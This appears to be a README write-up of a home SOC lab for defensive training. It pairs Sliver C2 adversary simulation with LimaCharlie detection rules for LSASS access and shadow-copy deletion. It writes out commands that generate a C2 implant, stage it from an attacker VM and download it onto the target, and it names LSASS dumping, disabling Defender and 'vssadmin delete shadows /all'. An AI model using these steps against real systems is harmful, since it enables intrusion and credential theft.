# SOC Analyst Home Lab

![Status](https://img.shields.io/badge/status-complete-brightgreen?style=flat-square)
![Platform](https://img.shields.io/badge/platform-VMware-blue?style=flat-square)
![EDR](https://img.shields.io/badge/EDR-LimaCharlie-orange?style=flat-square)
![C2](https://img.shields.io/badge/C2-Sliver-red?style=flat-square)

## Objective

Design and operate a self-contained virtual Security Operations Center (SOC) to simulate real-world adversary behavior end-to-end — from initial access through credential theft — and build automated detection and response logic in a production-grade EDR platform.

The lab follows [Eric Capuano's SOC Analyst guide](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part) and covers threat simulation, telemetry ingestion, custom detection rule authoring, YARA scanning, and ransomware TTP blocking.

---

## Skills Developed

- Designing and configuring an isolated virtual lab environment
- Deploying and tuning Sysmon for granular Windows telemetry
- Operating a Command & Control (C2) framework (Sliver) for adversary simulation
- Ingesting and analyzing endpoint telemetry in an EDR platform (LimaCharlie)
- Authoring custom Detection & Response (D&R) rules based on observed TTPs
- Writing YARA rules for file-based threat detection
- Automating response actions (process termination, quarantine)
- Mapping attack behavior to MITRE ATT&CK techniques

---

## Tools & Technologies

| Tool | Role |
|------|------|
| **VMware Workstation Pro** | Hypervisor — hosts isolated Windows and Linux VMs |
| **Sysmon** | Windows telemetry — process creation, network, file events |
| **Sliver C2** | Adversary simulation — C2 implant generation and session management |
| **LimaCharlie EDR** | Detection platform — telemetry ingestion, D&R rules, YARA scanning |

---

## Lab Architecture

```
┌─────────────────────────┐       ┌─────────────────────────┐
│   Windows VM (Target)   │       │   Linux VM (Attacker)   │
│                         │       │                         │
│  - Sysmon installed     │◄─────►│  - Sliver C2 server     │
│  - LimaCharlie agent    │  HTTP │  - Python HTTP server   │
│  - Defender disabled    │       │  - Payload staging      │
└─────────────────────────┘       └─────────────────────────┘
           │
           │ telemetry
           ▼
┌─────────────────────────┐
│     LimaCharlie EDR     │
│                         │
│  - Event ingestion      │
│  - D&R rule engine      │
│  - YARA scanning        │
└─────────────────────────┘
```

---

## Lab Phases

### Phase 1 — Environment Setup

Provisioned two isolated VMs in VMware Workstation Pro: a Windows target and a Linux attacker. Configured static IPs for reliable inter-VM communication, then deployed Sysmon on Windows using SwiftOnSecurity's hardened config for high-fidelity telemetry. Windows Defender was disabled via Group Policy and registry to allow unrestricted adversarial simulation.

```powershell
# Download and install Sysmon with SwiftOnSecurity config
Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon

Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml `
  -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml

C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml
```

---

### Phase 2 — C2 Infrastructure Deployment

Installed and launched a Sliver C2 server on the Linux VM, generated an HTTP-based implant payload, and staged it using a temporary Python web server. The payload was delivered to the Windows target via PowerShell. Once executed, a live C2 session checked back into the Sliver server, enabling post-exploitation reconnaissance.

```bash
# Install Sliver C2 on Linux VM
wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux \
  -O /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server
apt install -y mingw-w64

# Launch server and generate implant
sliver-server
> generate --http [LINUX_VM_IP] --save /opt/sliver
> implants

# Stage payload over HTTP
python3 -m http.server 80
```

```powershell
# Deliver payload to Windows target
IWR -Uri http://[LINUX_VM_IP]/[PAYLOAD].exe -Outfile C:\Users\User\Downloads\[PAYLOAD].exe
```

---

### Phase 3 — Adversary Simulation & Detection

Simulated credential theft by dumping the `lsass.exe` process — a core MITRE ATT&CK technique ([T1003.001 — LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)). Monitored the resulting telemetry in LimaCharlie in real time, identified the sensitive process access event, and authored a custom D&R rule to alert on future matches.

**Detection trigger:** Process accessing `lsass.exe` with suspicious access rights  
**Response action:** Generate alert with process metadata and source path

---

### Phase 4 — Automated Response & Ransomware Blocking

Built YARA-based detection to flag newly dropped executables on the Windows VM. Then crafted a D&R rule targeting `vssadmin delete shadows /all` — a hallmark ransomware pre-encryption step used to destroy Volume Shadow Copies — configured to automatically terminate the parent process upon match.

**Detection trigger:** `vssadmin` invoked with `delete shadows /all` arguments  
**Response action:** Terminate parent process immediately  
**Validation:** Re-ran the attack; the process was killed automatically before completion

---

## Detection & Response Rules

### LSASS Access Alert

```yaml
event: SENSITIVE_PROCESS_ACCESS
op: ends with
path: event/*/TARGET/FILE_PATH
value: lsass.exe
```

**Response:** Generate alert with full process tree and access rights

---

### Ransomware — VSS Deletion Block

```yaml
event: NEW_PROCESS
op: and
rules:
  - op: is
    path: event/FILE_PATH
    value: vssadmin.exe
  - op: contains
    path: event/COMMAND_LINE
    value: delete shadows
```

**Response:** Terminate parent process

---

## Key Takeaways

- Detection tuning matters — baselining normal behavior is essential before writing rules to avoid alert fatigue
- EDR telemetry from Sysmon is far richer than default Windows event logs and dramatically improves detection fidelity
- Automated D&R rules can block attacks in milliseconds — faster than any human response workflow
- Simulating attacks yourself builds intuition for what malicious telemetry looks like vs. legitimate activity

---

## References

- [Part 1 — Eric Capuano's SOC Analyst Guide](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part)
- [Part 2](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-ea2)
- [Part 3](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-part-77e)
- [SwiftOnSecurity Sysmon Config](https://github.com/SwiftOnSecurity/sysmon-config)
- [Sliver C2 — BishopFox](https://github.com/BishopFox/sliver)
- [LimaCharlie EDR](https://limacharlie.io)
- [MITRE ATT&CK T1003.001](https://attack.mitre.org/techniques/T1003/001/)
